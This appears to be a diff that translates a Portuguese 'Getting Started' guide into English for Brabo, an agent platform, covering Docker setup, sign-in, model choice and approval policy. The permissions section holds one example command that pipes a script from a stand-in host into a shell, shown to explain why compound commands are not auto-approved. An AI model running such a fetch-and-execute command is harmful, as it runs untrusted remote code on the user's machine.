@@ -1,31 +1,31 @@
 ---
 id: getting-started
-title: Primeiros passos
-sidebar_label: Primeiros passos
+title: Getting Started
+sidebar_label: Getting Started
 sidebar_position: 5
-description: Do clone ao primeiro turno de agente, com o que checar quando cada etapa não funciona.
-keywords: [instalação, setup, onboarding, primeiro projeto, ollama]
+description: From clone to a first agent turn, with what to check when each step doesn't work.
+keywords: [installation, setup, onboarding, first project, ollama]
 ---
 
-# Primeiros passos
+# Getting Started
 
-Do clone até um agente trabalhando. Se algo falhar, cada etapa tem o que
-conferir logo abaixo dela.
+From clone to an agent working. If something fails, each step has what to
+check right below it.
 
-## Antes de começar
+## Before you start
 
-| ferramenta | por quê |
+| tool | why |
 |---|---|
-| Docker e Docker Compose | tudo sobe em container |
-| Node 20+ e **pnpm** | o monorepo é pnpm; `npm install` não funciona |
-| ~6 GiB de RAM livre | Postgres, três apps e, se quiser agente de verdade, o Ollama |
+| Docker and Docker Compose | everything comes up in a container |
+| Node 20+ and **pnpm** | the monorepo is pnpm; `npm install` doesn't work |
+| ~6 GiB of free RAM | Postgres, three apps, and, if you want a real agent, Ollama |
 
-Elixir **não** é obrigatório: o engine roda no container. Você só precisa dele
-no host se for rodar `pnpm engine:dev` fora do Docker — e aí precisa da versão
-exata (1.17.3 / OTP 27.1.2), porque o `mix format` de versões diferentes deixa
-o CI vermelho.
+Elixir is **not** required: the engine runs in the container. You only need
+it on the host if you're going to run `pnpm engine:dev` outside Docker —
+and then you need the exact version (1.17.3 / OTP 27.1.2), because
+`mix format` from a different version turns CI red.
 
-## 1. Subir
+## 1. Bring it up
 
 ```bash
 git clone git@github.com:daneiel/brabo.git
@@ -35,186 +35,197 @@ pnpm install
 pnpm dev
 ```
 
-O `.env.example` já vem com tudo apontando para os containers — na primeira
-subida você não precisa editar nada.
+`.env.example` already points everything at the containers — on the first
+run you don't need to edit anything.
 
-`pnpm dev` sobe Postgres 16 + pgvector, api, engine e web, e aplica as
-migrações dos dois lados. A primeira vez baixa imagens e leva alguns minutos.
+`pnpm dev` brings up Postgres 16 + pgvector, api, engine, and web, and
+applies migrations on both sides. The first time pulls images and takes a
+few minutes.
 
-### Os dois modos locais não coexistem
+### The two local modes don't coexist
 
-Há duas formas de rodar o Brabo na sua máquina, e elas **disputam as mesmas
-portas**:
+There are two ways to run Brabo on your machine, and they **fight over the
+same ports**:
 
-| modo | sobe com | web em | o que é |
+| mode | comes up with | web at | what it is |
 |---|---|---|---|
-| **desenvolvimento** | `pnpm dev` | <http://localhost:5173> | compose + Vite, com hot reload |
-| **validação** | `make deploy-local` | <http://localhost:8088> | k3d com as imagens de produção |
+| **development** | `pnpm dev` | <http://localhost:5173> | compose + Vite, with hot reload |
+| **validation** | `make deploy-local` | <http://localhost:8088> | k3d with the production images |
 
-Os dois publicam api em `:3000` e engine em `:4000`. Isso é **deliberado**
-(ADR 0025, decisão 10): mantendo as portas, o `docker/smoke.sh` vale nos dois
-sem tradução. O preço é que só um roda por vez.
+Both publish api on `:3000` and engine on `:4000`. That's **deliberate**
+(ADR 0025, decision 10): by keeping the ports, `docker/smoke.sh` holds for
+both without translation. The price is that only one runs at a time.
 
-Com o cluster de pé, o `pnpm dev` não consegue publicar a porta do `api`; como
-o serviço `web` depende dele, a **5173 nunca abre**. Um `preflight` roda antes
-do compose e diz exatamente isso, em vez do `port is already allocated` do
-Docker:
+With the cluster up, `pnpm dev` can't publish the `api` port; since the
+`web` service depends on it, **5173 never opens**. A `preflight` step runs
+before compose and says exactly that, instead of Docker's
+`port is already allocated`:
 
 ```bash
-make k8s-down && pnpm dev     # do modo validação para o de desenvolvimento
+make k8s-down && pnpm dev     # from validation mode to development mode
 ```
 
-Para saber em qual você está sem adivinhar: `pnpm dev:preflight`.
+To know which one you're in without guessing: `pnpm dev:preflight`.
 
-### Pasta local dos workspaces
+### Local folder for workspaces
 
-Por padrão, os arquivos que os agentes escrevem vivem num volume Docker
-gerenciado — não é uma pasta que você abre no Finder/Explorer. Para trocar
-por uma pasta real do seu disco, defina no `.env`:
+By default, the files agents write live in a managed Docker volume — not a
+folder you can open in Finder/Explorer. To swap it for a real folder on
+your disk, set in `.env`:
 
 ```bash
 PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
 GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
 ```
 
-As duas juntas, sempre — `api` e `engine` leem o mesmo caminho, e valores
-diferentes fariam os dois enxergarem árvores diferentes do mesmo
-repositório. A pasta escolhida vira a raiz de **todos** os projetos desta
-instância — não aponte para `$HOME` inteiro nem para uma pasta com outros
-segredos seus.
+Both together, always — `api` and `engine` read the same path, and
+different values would make the two see different trees of the same
+repository. The chosen folder becomes the root for **all** projects on
+this instance — don't point it at your entire `$HOME` or at a folder with
+other secrets of yours.
 
-Dentro dela, cada projeto tem sua própria subpasta, nomeada por
-`workspace_dir_name` (RN-109): projeto criado a partir desta mudança ganha
-um nome LEGÍVEL, `<pasta>/<slug>-<8 chars do id>` (ex.: `<pasta>/checkout-
-3f2b1c8e`), em vez do UUID puro — mais fácil de reconhecer abrindo a pasta no
-Finder/Explorer. Projeto criado ANTES desta mudança continua com a pasta
-nomeada pelo UUID puro (`<pasta>/<project_id>`): o nome é decidido uma única
-vez, na criação, e nunca é recalculado — nem quando o slug do projeto muda
-depois nas Configurações.
+Inside it, each project has its own subfolder, named by
+`workspace_dir_name` (RN-109): a project created from this change onward
+gets a READABLE name, `<folder>/<slug>-<8 chars of id>` (e.g. `<folder>/
+checkout-3f2b1c8e`), instead of a raw UUID — easier to recognize when
+opening the folder in Finder/Explorer. A project created BEFORE this
+change keeps its folder named by the raw UUID (`<folder>/<project_id>`):
+the name is decided once, at creation, and is never recomputed — not even
+when the project's slug changes later in Settings.
 
-Nada na política de aprovação muda: dentro do escopo do projeto o agente já
-tinha acesso mais livre e fora dele já pedia aprovação (RN-075) — só o que
-antes ficava invisível dentro do volume passa a estar numa pasta que você
-pode abrir com seu próprio editor e `git`.
+Nothing in the approval policy changes: inside the project's scope the
+agent already had freer access, and outside it it already required
+approval (RN-075) — the only thing that changes is that what used to be
+invisible inside the volume is now in a folder you can open with your own
+editor and `git`.
 
-Os containers de `api` e `engine` rodam como **root** em desenvolvimento
-(mesma situação já conhecida do `node_modules`/`apps/api/dist` — ver o aviso
-no topo deste repositório). Todo arquivo que o agente escrever na pasta
-local sai dono de `root` no seu disco — para editar/apagar sem `sudo`
-depois, rode uma vez `sudo chown -R $USER ~/brabo-projetos`
-(ajuste o caminho para o que você escolheu). Confirmado por execução: um
-`docker run` escrevendo num bind mount de teste deixou o arquivo
-inacessível ao usuário comum até um segundo container (rodando como root)
-removê-lo.
+The `api` and `engine` containers run with the **same UID/GID as your host
+user** (see the warning at the top of this repository) — never as root.
+Discover your pair with `id -u`/`id -g` and, if it doesn't match the
+default (1000/1000, the most common on a single-developer Linux machine),
+set `DEV_UID`/`DEV_GID` in `.env` (see `.env.example`) before the first
+`docker compose up`. With that in place, every file the agent writes to the
+local folder ends up owned by YOU, editable/removable without `sudo`.
+Confirmed by execution: with the UID mapped, a `docker run` writing to a
+test bind mount left the file owned by the host user and freely removable
+from the host — the exact opposite of what an earlier root-only image did.
 
-Só testado em Linux/macOS. Bind mount de host no Docker Desktop para Windows
-tem armadilhas conhecidas (permissão/dono entre NTFS e o usuário do
-container, e NTFS não distingue maiúscula de minúscula onde `git worktree`
-espera que distinga) — não habilite lá ainda.
+Only tested on Linux/macOS. Host bind mounts on Docker Desktop for Windows
+have known pitfalls (permission/ownership between NTFS and the container
+user, and NTFS doesn't distinguish upper from lower case where `git
+worktree` expects it to) — don't enable it there yet.
 
-**Se não subir:**
+**If it doesn't come up:**
 
-| sintoma | causa |
+| symptom | cause |
 |---|---|
-| porta ocupada | quase sempre é o cluster local ainda de pé — veja acima. Se não for, mude `API_PORT`, `ENGINE_PORT`, `WEB_PORT` ou `OLLAMA_PORT` no `.env`. Mudar `WEB_PORT` é seguro: o `WEB_ORIGIN` do CORS deriva dele, então a origem aceita acompanha a porta ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
-| api sobe e cai | veja `docker compose logs api` — quase sempre é a migração |
+| port taken | it's almost always the local cluster still up — see above. If not, change `API_PORT`, `ENGINE_PORT`, `WEB_PORT`, or `OLLAMA_PORT` in `.env`. Changing `WEB_PORT` is safe: CORS's `WEB_ORIGIN` derives from it, so the accepted origin follows the port ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
+| api comes up and dies | check `docker compose logs api` — it's almost always the migration |
 
-## 2. Entrar
+## 2. Sign in
 
-O login é da própria api — não há mais IdP externo
-([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Semeie um
-usuário pronto:
+Login belongs to the api itself — there's no more external IdP
+([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Seed a
+ready-made user:
 
 ```bash
 pnpm --filter api seed
 ```
 
-Ele cria `owner@brabo.dev` (owner) e `dev@brabo.dev` (developer), os dois já
-com e-mail verificado e a senha `brabo12345678` — sobrescrevível por
-`BRABO_SEED_PASSWORD`. Junto vem o workspace **Acme Corp**, pronto para criar
-projeto.
+It creates `owner@brabo.dev` (owner) and `dev@brabo.dev` (developer), both
+already with a verified email and the password `brabo12345678` —
+overridable via `BRABO_SEED_PASSWORD`. Along with it comes the **Acme
+Corp** workspace, ready to create a project.
 
-Abra <http://localhost:5173> e entre com essas credenciais.
+Open <http://localhost:5173> and sign in with those credentials.
 
-> **Por que semear em vez de se cadastrar pela tela?** O cadastro funciona, mas
-> o login exige e-mail verificado e o `MailSender` é log-only nesta fase — o
-> link de verificação sai no log da api e, por default, **sem o token**. Para
-> percorrer o fluxo de cadastro de verdade, ligue `AUTH_MAIL_LOG_TOKENS=true`
-> no `.env` e pegue o link em `docker compose logs api`. É inconveniente de
-> propósito: token de verificação em log de aplicação é credencial em texto
-> claro.
+> **Why seed instead of signing up through the screen?** Sign-up works, but
+> login requires a verified email and `MailSender` is log-only at this
+> stage — the verification link goes out in the api's log and, by default,
+> **without the token**. To walk through the real sign-up flow, turn on
+> `AUTH_MAIL_LOG_TOKENS=true` in `.env` and grab the link from `docker
+> compose logs api`. It's inconvenient on purpose: a verification token in
+> an application log is a credential in plain text.
 
-**Se o login devolver 401 com a senha certa:** confira que o seed rodou contra
-o **mesmo** banco que a api está usando — `DATABASE_URL` do `.env`. A resposta
-é a mesma para senha errada, e-mail inexistente e conta bloqueada, de propósito
-([RN-032](business-rules.md#rn-032)), então ela não distingue os casos para
-você.
+**If login returns 401 with the right password:** check that the seed ran
+against the **same** database the api is using — `DATABASE_URL` from
+`.env`. The response is the same for a wrong password, a nonexistent
+email, and a locked account, on purpose
+([RN-032](business-rules/autenticacao.md#rn-032)), so it doesn't distinguish the cases
+for you.
 
-## 3. Configurar um modelo
+## 3. Configure a model
 
-Já vem um: o container do Ollama baixa **`llama3.2:1b`** sozinho no primeiro
-boot. Serve para ver o sistema funcionando de ponta a ponta sem configurar
-nada.
+One already comes set up: the Ollama container pulls **`llama3.2:1b`** on
+its own on the first boot. Enough to see the system working end to end
+without configuring anything.
 
-Ele é pequeno demais para trabalho de verdade, então quando quiser mais:
+It's too small for real work, so when you want more:
 
-**Modelo local maior** — de graça, e roda offline:
+**A bigger local model** — free, and runs offline:
 
 ```bash
 docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
 ```
 
-**API de provedor** — na UI, em **Projeto → Configurações → Credenciais**. A
-chave é cifrada com envelope encryption antes de tocar o banco.
+**A provider API** — in the UI, under **Project → Settings →
+Credentials**. The key is encrypted with envelope encryption before it
+touches the database.
 
-O modelo é resolvido em cascata — **sessão > agente > projeto > workspace**, o
-primeiro que existir ([RN-020](business-rules.md#rn-020)). Dá para deixar o
-local no geral e pôr um modelo de API só no QA, que é o papel que menos cabe
-num modelo pequeno.
+The model is resolved in a cascade — **session > agent > project >
+workspace**, the first one that exists
+([RN-020](business-rules/custo.md#rn-020)). You can leave the local one as the
+default and put an API model just on QA, the role that fits worst in a
+small model.
 
-> Com GPU NVIDIA, use `pnpm dev:gpu`. Sem a reserva de device o Ollama roda
-> 100% em CPU e um prompt de 7.000 tokens leva ~50 s **só de ingestão** — o
-> agente parece travado quando na verdade está lendo. O override é opt-in
-> porque sem o `nvidia-container-toolkit` no host a reserva faz o serviço
-> **falhar ao subir**.
+> With an NVIDIA GPU, use `pnpm dev:gpu`. Without the device reservation,
+> Ollama runs 100% on CPU and a 7,000-token prompt takes ~50s **just for
+> ingestion** — the agent looks stuck when it's actually reading. The
+> override is opt-in because without `nvidia-container-toolkit` on the
+> host the reservation makes the service **fail to start**.
 
-## 4. Criar um projeto
+## 4. Create a project
 
-Dashboard → **Novo projeto**. O wizard pede nome e como conectar o git:
+Dashboard → **New project**. The wizard asks for a name and how to connect
+git:
 
-| opção | quando usar |
+| option | when to use |
 |---|---|
-| **Local** | experimentar. Bare repos no disco, sem conta em lugar nenhum |
-| **GitHub** / **GitLab** | trabalho de verdade. PAT ou OAuth |
+| **Local** | to experiment. Bare repos on disk, no account anywhere |
+| **GitHub** / **GitLab** | real work. PAT or OAuth |
 
-Ao confirmar, roda o **bootstrap de Gitflow**: cinco passos que criam `dev`,
-`qa`, `main`, aplicam proteções e commitam os arquivos base. O progresso
-aparece ao vivo.
+On confirming, it runs the **Gitflow bootstrap**: five steps that create
+`dev`, `qa`, `main`, apply protections, and commit the base files.
+Progress shows live.
 
-Alguns passos podem sair como **`skipped`** (já estava feito) ou
-**`degraded`** (concluiu sem uma capability). Os dois são sucesso. Com o
-provider Local, a proteção de branch sempre sai `degraded` — não há plataforma
-para aplicá-la, e isso não enfraquece nada: quem impede merge indevido é o
-[teto no domínio](reference/permissions.md#os-tetos), não a plataforma.
+Some steps can come back as **`skipped`** (already done) or **`degraded`**
+(finished without a capability). Both are success. With the Local
+provider, branch protection always comes back `degraded` — there's no
+platform to apply it to, and that doesn't weaken anything: what prevents
+an improper merge is the [ceiling in the domain](reference/permissions.md#caps),
+not the platform.
 
-Se um passo falhar, corrija a causa e mande retomar: o bootstrap continua de
-onde parou, não recomeça
+If a step fails, fix the cause and tell it to resume: the bootstrap picks
+up where it left off, it doesn't start over
 ([RN-029](business-rules.md#rn-029)).
 
-## 5. O primeiro turno
+## 5. The first turn
 
-Abra o projeto → **Sessões** → nova sessão. O Criativo é quem conduz a ideação.
+Open the project → **Sessions** → new session. The Creative agent is the
+one who runs ideation.
 
-Converse normalmente. Em algum momento ele vai querer fazer algo com efeito
-externo — e aí você vê o mecanismo central funcionando: a ação aparece em
-**Aprovações** esperando sua decisão, em vez de acontecer.
+Chat normally. At some point it will want to do something with an
+external effect — and that's when you see the central mechanism at work:
+the action shows up in **Approvals** waiting for your decision, instead
+of just happening.
 
-Aprove e observe o `TokenMeter`: cada turno tem custo, medido na hora.
+Approve it and watch the `TokenMeter`: every turn has a cost, measured on
+the spot.
 
-## 6. Afrouxar (ou apertar) a política
+## 6. Loosen (or tighten) the policy
 
-Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz
-do workspace do projeto, é onde isso se ajusta:
+While everything asks for approval, you approve a lot. `permissions.json`,
+at the root of the project's workspace, is where you tune that:
 
 ```json
 {
@@ -224,73 +235,102 @@ do workspace do projeto, é onde isso se ajusta:
 }
 ```
 
-Comece por `allow` de comandos idempotentes de leitura. Duas coisas que valem
-saber antes de mexer:
+Start by allowing idempotent read commands. Two things worth knowing
+before you touch it:
 
-- **Casamento é por prefixo de tokens, não substring.** `Terminal(pnpm test)`
-  casa `pnpm test --watch`, mas `Terminal(rm)` **não** casa `sudo rm -rf x`.
-- **Comando composto exige que todos os segmentos estejam em `allow`.**
-  `pnpm test && curl evil.sh | sh` não é auto-aprovado por causa da primeira
-  metade.
+- **Matching is by token prefix, not substring.** `Terminal(pnpm test)`
+  matches `pnpm test --watch`, but `Terminal(rm)` does **not** match `sudo
+  rm -rf x`.
+- **A compound command requires every segment to be in `allow`.**
+  `pnpm test && curl evil.sh | sh` isn't auto-approved just because of the
+  first half.
 
-O formato completo está em [Permissões](reference/permissions.md).
+The full format is in [Permissions](reference/permissions.md).
 
-## Quando parece travado
+## When it looks stuck
 
-| sintoma | onde olhar |
+| symptom | where to look |
 |---|---|
-| agente não responde | modelo configurado? `docker compose logs engine` |
-| resposta vazia ou sem sentido | quase sempre é [ambiente de inferência](runbook.md#ambiente-de-inferencia) — contexto truncado ou memória |
-| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
-| painel não atualiza | o canal Phoenix caiu; recarregue. O event log não se perde |
-| sessão parada em `closing` | o drain não completou — [runbook](runbook.md#quando-a-sessao-escapa) |
+| agent not responding | is a model configured? `docker compose logs engine` |
+| empty or nonsensical response | it's almost always the [inference environment](runbook.md#ambiente-de-inferencia) — truncated context or memory |
+| action stuck in `pending` | that's by design: it's **waiting for you** in Approvals |
+| panel not updating | the Phoenix channel dropped; reload. The event log isn't lost |
+| session stuck in `closing` | the drain didn't complete — [runbook](runbook.md#quando-a-sessao-escapa) |
 
-## Desenvolvendo no projeto
+## Developing on the project
 
 ```bash
 pnpm --filter api test      # vitest
 pnpm --filter web test      # vitest
 pnpm engine:test            # ExUnit
-pnpm build                  # build de tudo
-pnpm db:generate            # depois de mudar apps/api/src/db/schema.ts
-pnpm db:migrate             # aplica as migrações
-pnpm dev:down               # derruba tudo
+pnpm build                  # build everything
+pnpm db:generate            # after changing apps/api/src/db/schema.ts
+pnpm db:migrate             # applies the migrations
+pnpm dev:down               # tear everything down
 ```
 
-### O menu, para não decorar isso tudo
+### The browser E2E
+
+Three layers below it already run on `pnpm test`. The fourth needs the
+**production compose up**, because what it proves — the `httpOnly` refresh
+cookie, the cross-origin CSRF, the session socket's single-use ticket —
+only exists when the web, the api and the engine sit on three different
+origins ([ADR 0120](adr/0120-e2e-de-navegador-contra-o-compose-de-producao.md)).
+
+```bash
+pnpm e2e:navegadores                      # once: downloads chromium
+SMOKE_KEEP_UP=1 bash docker/smoke.sh      # brings the prod stack up and leaves it
+pnpm e2e                                  # runs the specs against it
+docker compose -f docker/docker-compose.prod.yml down -v
+```
+
+`e2e/` is not a workspace member — it has its own lockfile, so `pnpm --filter`
+won't find it. That's deliberate, and `e2e/README.md` says why.
+
+### The menu, so you don't have to memorize all this
 
 ```bash
 pnpm bootstrap
 ```
 
-Esses comandos moram em três lugares que não conversam — `package.json`, o
-`Makefile` (Kubernetes) e scripts em `deploy/k8s/` e `docker/`. O menu junta os
-quatro grupos (Docker, K8s, Database, Test) numa porta só, navegado por dígito
-sem Enter, com `v` para voltar e `q` para sair; os atalhos válidos aparecem no
-rodapé. Enquanto um comando roda, a tela mostra só que está rodando — `↓` revela
-a saída ao vivo e `↑` a esconde.
+These commands live in three places that don't talk to each other —
+`package.json`, the `Makefile` (Kubernetes), and scripts under
+`deploy/k8s/` and `docker/`. The menu brings the four groups (Docker, K8s,
+Database, Test) together in one door, navigated by digit with no Enter,
+with `v` to go back and `q` to quit; valid shortcuts show in the footer.
+While a command is running, the screen shows only that it's running — `↓`
+reveals the live output and `↑` hides it.
 
-Ele **não reimplementa nada**: cada item chama exatamente o comando que já
-existe, e `pnpm bootstrap --print-commands` imprime a árvore inteira com o
-comando de cada folha, sem executar — é assim que se confere o que ele faz antes
-de deixá-lo fazer. A lista completa está em
+It **doesn't reimplement anything**: each item calls exactly the command
+that already exists, and `pnpm bootstrap --print-commands` prints the
+whole tree with each leaf's command, without executing — that's how you
+check what it does before letting it do it. The full list is in
 [Scripts](reference/scripts.md).
 
-Um item pede cuidado: **`Database › Delete`** apaga todas as tabelas (as da api e
-as do engine, que dividem o mesmo banco). É a única tela que pede Enter, exige
-digitar o nome do banco, e diz ao final que recuperar é `pnpm db:migrate` **e**
+One item deserves care: **`Database › Delete`** drops every table (the
+api's and the engine's, which share the same database). It's the only
+screen that requires pressing Enter, requires typing the database name,
+and says at the end that recovering means `pnpm db:migrate` **and**
 `pnpm engine:migrate`.
 
-Trabalhe sempre em `feature/*` a partir de `dev`, com conventional commits em
-pt-BR. `CLAUDE.md` tem as convenções completas.
+Always work in `feature/*` off `dev`, with conventional commits in
+pt-BR. `CLAUDE.md` has the full conventions.
 
-> Os containers de `api` e `web` rodam como root em desenvolvimento e escrevem
-> no bind mount. Se depois quiser buildar no host, rode uma vez
-> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.
+> The `api`, `web` and `engine` containers run with the same UID/GID as your
+> host user in development — never as root — so `apps/api/dist` and
+> whatever else gets written to the bind mount are already yours. Run
+> `id -u`/`id -g` and, if the pair isn't 1000/1000, set `DEV_UID`/`DEV_GID`
+> in `.env` (see `.env.example`) before the first `docker compose up`.
+> Upgrading an environment that predates this change: the named volumes for
+> `node_modules`/`_build`/`deps`/`.mix`/`.hex` still hold content written by
+> the old root containers — run once
+> `sudo chown -R $USER apps/api/dist apps/*/node_modules` (or drop the
+> volumes with `docker compose down -v` and let the next `up` recreate them)
+> to clear what's stuck.
 
-## Depois
+## Next
 
-- [Arquitetura](architecture.md) — como as peças se encaixam
-- [Regras de negócio](business-rules.md) — o que o sistema garante, e onde isso
-  vive no código
-- [Runbook](runbook.md) — quando sair de desenvolvimento
+- [Architecture](architecture.md) — how the pieces fit together
+- [Business rules](business-rules.md) — what the system guarantees, and
+  where that lives in code
+- [Runbook](runbook.md) — when you leave development behind
